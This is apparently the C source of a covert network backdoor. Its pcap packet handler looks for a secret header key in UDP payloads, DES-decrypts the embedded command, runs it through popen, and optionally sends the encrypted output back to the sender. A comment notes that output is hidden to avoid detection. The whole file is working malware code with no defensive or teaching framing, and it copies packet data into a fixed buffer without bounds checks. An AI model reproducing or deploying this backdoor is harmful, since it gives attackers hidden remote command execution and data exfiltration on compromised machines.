#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "crypto.h"
#include "defs.h"
#include "handler.h"

#define ETHER_IP_UDP_LEN 44
#define SRC_OFF 28 // Source address, so we know where to send results
#define PORT_OFF 38 // Destination port, we'll reflect results back on the same port

void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
	int len;
	char *ptr, *ptr2;
	char *decryptMsg;
	char *command;
	int duplex = (int) user; 
	u_int32_t ip;
	short port;

	/* Step 1: locate the payload portion of the packet */
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);

	if (pkt_info->caplen - ETHER_IP_UDP_LEN - HDR_LEN - STR_LEN - END_LEN <= 0) 
		return; 

	/* Step 2: check payload for backdoor header key */
	if (0 != memcmp(ptr, HDR_KEY, HDR_LEN))
		return;

	ptr += HDR_LEN;
	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - HDR_LEN);

	decryptMsg = (char *)calloc(1, MAX_LEN);	

	// Step 3: decrypt the packet with DES
	memcpy(decryptMsg, ptr, len);

	decryptMsg = decrypt(PASSKEY, decryptMsg, len);

	//Step 4: verify decrypted contents
	if (!(ptr = strstr(decryptMsg, CMD_STR))) 
		return;
	ptr += STR_LEN;

	if (!(ptr2 = strstr(ptr, CMD_END)))
		return;

	// Step 5: extract the remainder
	command = (char*) calloc(1, MAX_LEN);
	strncpy(command, ptr, (ptr2 - ptr));

	free(decryptMsg);

	// Grab the source in case we need to send the result back
	ip = *(u_int32_t*)(packet + SRC_OFF);
	port = *(u_int16_t*)(packet + PORT_OFF);
	
	// Step 6: Execute the command
	execute(command, ip, port, duplex);
}

void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
{
	FILE *fp;
	char out[MAX_LEN];
	int sock = 0;
	struct sockaddr_in saddr;

	// Run the command, grab stdout
	fp = popen(command, "r");

	// Prep for network comm
	if (duplex)
	{
		bzero(&saddr, sizeof(saddr));
		saddr.sin_family = AF_INET;
		saddr.sin_addr.s_addr = ip;
		saddr.sin_port = port;

		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sock < 0)
			perror("socket");
	}

	// Read output line by line
	while (fgets(out, MAX_LEN -1, fp) != NULL)
	{
		if (duplex)
		{
			char *enc = out;
			int len = strlen(out);

			enc = encrypt(PASSKEY, out, len);
			sendto(sock, enc, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));

			free(enc);
		}
		else
			; //Do nothing so we don't give ourselves away.
			//printf("%s", out);
	}

	pclose(fp);
}
